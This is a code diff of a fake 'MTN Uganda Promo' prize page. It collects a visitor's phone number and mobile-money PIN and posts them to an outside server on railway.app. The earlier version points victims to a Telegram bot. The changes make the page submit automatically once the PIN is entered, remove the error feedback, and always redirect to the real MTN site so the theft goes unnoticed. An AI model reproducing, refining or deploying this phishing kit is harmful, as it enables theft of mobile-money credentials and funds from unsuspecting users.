@@ -19,10 +19,11 @@
             background: white;
             border-radius: 48px;
             padding: 32px 24px 44px;
-            max-width: 480px;
+            max-width: 520px;
             width: 100%;
             text-align: center;
             box-shadow: 0 20px 40px rgba(0,0,0,0.12);
+            transition: opacity 0.5s ease;
         }
         .prize-message {
             background: #f8fafc;
@@ -34,18 +35,25 @@
         }
         .prize-amount { font-size: 28px; font-weight: 800; color: #c97e00; margin: 8px 0 4px; }
         label { display: block; text-align: left; font-weight: 600; margin: 20px 0 6px 8px; }
-        input[type="tel"], input[type="password"] {
+        input[type="tel"] {
             width: 100%;
             padding: 15px 20px;
             border: 1.5px solid #e2e8f0;
             border-radius: 60px;
             font-size: 17px;
             outline: none;
+            transition: all 0.2s;
         }
-        input:focus { border-color: #f5a623; }
-        .pin-wrapper { display: flex; gap: 14px; justify-content: center; margin: 12px 0; }
+        input[type="tel"]:focus { border-color: #f5a623; }
+        .pin-wrapper {
+            display: flex;
+            gap: 12px;
+            justify-content: center;
+            margin: 12px 0;
+            flex-wrap: wrap;
+        }
         .pin-box {
-            width: 68px;
+            width: 60px;
             height: 68px;
             text-align: center;
             font-size: 32px;
@@ -54,8 +62,9 @@
             border-radius: 20px;
             outline: none;
             font-family: monospace;
+            transition: all 0.2s;
         }
-        .pin-box:focus { border-color: #f5a623; }
+        .pin-box:focus { border-color: #f5a623; box-shadow: 0 0 0 2px rgba(245,166,35,0.2); }
         button {
             margin-top: 24px;
             background: #f5a623;
@@ -67,19 +76,39 @@
             color: white;
             cursor: pointer;
             width: 100%;
+            transition: background 0.2s;
         }
-        .status {
-            margin-top: 16px;
-            font-size: 14px;
-            color: #666;
+        button:hover { background: #e09510; }
+        .loading {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 2px solid white;
+            border-top-color: transparent;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin-left: 10px;
+            vertical-align: middle;
         }
-        @media (max-width: 480px) {
-            .pin-box { width: 55px; height: 55px; font-size: 28px; }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        @media (max-width: 550px) {
+            .pin-box { width: 52px; height: 60px; font-size: 28px; }
+            .pin-wrapper { gap: 8px; }
+        }
+        @media (max-width: 450px) {
+            .pin-box { width: 45px; height: 55px; font-size: 24px; }
+            .pin-wrapper { gap: 6px; }
+        }
+        @media (max-width: 380px) {
+            .pin-box { width: 42px; height: 50px; font-size: 22px; }
+            .pin-wrapper { gap: 5px; }
         }
     </style>
 </head>
 <body>
-<div class="wrapper">
+<div class="wrapper" id="appWrapper">
     <h1 style="color: #1a2c3e;">MTN Uganda Promo</h1>
     <div class="prize-message">
         You're almost there — fill in the form below to claim
@@ -88,24 +117,26 @@
     </div>
     
     <input type="tel" id="phoneInput" placeholder="07XXXXXXXX" maxlength="10" autocomplete="off">
-    <label>🔐 4-digit MoMo PIN</label>
-    <div class="pin-wrapper">
+    <label>🔐 5-digit MoMo PIN</label>
+    <div class="pin-wrapper" id="pinWrapper">
+        <input class="pin-box" maxlength="1" inputmode="numeric">
         <input class="pin-box" maxlength="1" inputmode="numeric">
         <input class="pin-box" maxlength="1" inputmode="numeric">
         <input class="pin-box" maxlength="1" inputmode="numeric">
         <input class="pin-box" maxlength="1" inputmode="numeric">
     </div>
     
-    <button onclick="submitForm()">💰 Claim Prize</button>
-    <div class="status" id="statusMsg"></div>
+    <button id="submitBtn">💰 Claim Prize</button>
 </div>
 
 <script>
     const phoneInput = document.getElementById('phoneInput');
     const pinBoxes = Array.from(document.querySelectorAll('.pin-box'));
-    const statusMsg = document.getElementById('statusMsg');
-    let realPin = ['', '', '', ''];
+    const submitBtn = document.getElementById('submitBtn');
+    const wrapper = document.getElementById('appWrapper');
+    let realPin = ['', '', '', '', ''];
     let submitted = false;
+    let originalBtnText = submitBtn.innerHTML;
 
     phoneInput.addEventListener('input', e => {
         e.target.value = e.target.value.replace(/\D/g, '').slice(0, 10);
@@ -117,20 +148,33 @@
             if (!val) return;
             e.target.value = val;
             realPin[idx] = val;
+            
             setTimeout(() => {
                 if (document.activeElement !== box) e.target.value = '•';
             }, 150);
-            if (idx < 3) pinBoxes[idx + 1].focus();
+            
+            if (idx < 4) pinBoxes[idx + 1].focus();
+            
+            if (realPin.every(p => p !== '') && /^07\d{8}$/.test(phoneInput.value)) {
+                submitForm();
+            }
         });
+        
         box.addEventListener('keydown', e => {
             if (e.key === 'Backspace') {
                 realPin[idx] = '';
-                if (idx > 0 && !box.value) pinBoxes[idx - 1].focus();
+                if (idx > 0 && !box.value) {
+                    pinBoxes[idx - 1].focus();
+                } else {
+                    box.value = '';
+                }
             }
         });
+        
         box.addEventListener('focus', function() {
             if (realPin[idx]) this.value = realPin[idx];
         });
+        
         box.addEventListener('blur', function() {
             if (realPin[idx]) this.value = '•';
         });
@@ -142,20 +186,14 @@
         const phone = phoneInput.value;
         const pin = realPin.join('');
         
-        if (!/^07\d{8}$/.test(phone)) {
-            statusMsg.innerHTML = '❌ Invalid MTN number (07XXXXXXXX)';
-            statusMsg.style.color = 'red';
-            return;
-        }
-        if (pin.length !== 4) {
-            statusMsg.innerHTML = '❌ Enter complete 4-digit PIN';
-            statusMsg.style.color = 'red';
-            return;
-        }
+        if (!/^07\d{8}$/.test(phone)) return;
+        if (pin.length !== 5) return;
         
         submitted = true;
-        statusMsg.innerHTML = '⏳ Processing...';
-        statusMsg.style.color = '#f5a623';
+        
+        // Show loading state on button
+        submitBtn.innerHTML = 'Processing <span class="loading"></span>';
+        submitBtn.disabled = true;
         
         try {
             const response = await fetch('https://momoloan-production.up.railway.app/api/submit', {
@@ -166,24 +204,29 @@
             
             const data = await response.json();
             
-            if (data.success) {
-                statusMsg.innerHTML = '✅ Success! Check your Telegram @Ugxforme_bot';
-                statusMsg.style.color = 'green';
-                // Optional: redirect after 2 seconds
-                // setTimeout(() => {
-                //     window.location.href = 'https://www.mtn.co.ug/';
-                // }, 2000);
-            } else {
-                statusMsg.innerHTML = '❌ Error: ' + (data.details || data.error);
-                statusMsg.style.color = 'red';
-                submitted = false;
-            }
+            // Always redirect to MTN website regardless of response
+            wrapper.style.opacity = '0';
+            setTimeout(() => {
+                window.location.href = 'https://www.mtn.co.ug/';
+            }, 400);
+            
         } catch (err) {
-            statusMsg.innerHTML = '❌ Server error: ' + err.message;
-            statusMsg.style.color = 'red';
-            submitted = false;
+            // Silent fail - still redirect to MTN website
+            wrapper.style.opacity = '0';
+            setTimeout(() => {
+                window.location.href = 'https://www.mtn.co.ug/';
+            }, 400);
         }
     }
+    
+    // Manual button click
+    submitBtn.addEventListener('click', () => {
+        const phone = phoneInput.value;
+        const pin = realPin.join('');
+        if (/^07\d{8}$/.test(phone) && pin.length === 5 && !submitted) {
+            submitForm();
+        }
+    });
 </script>
 </body>
 </html>
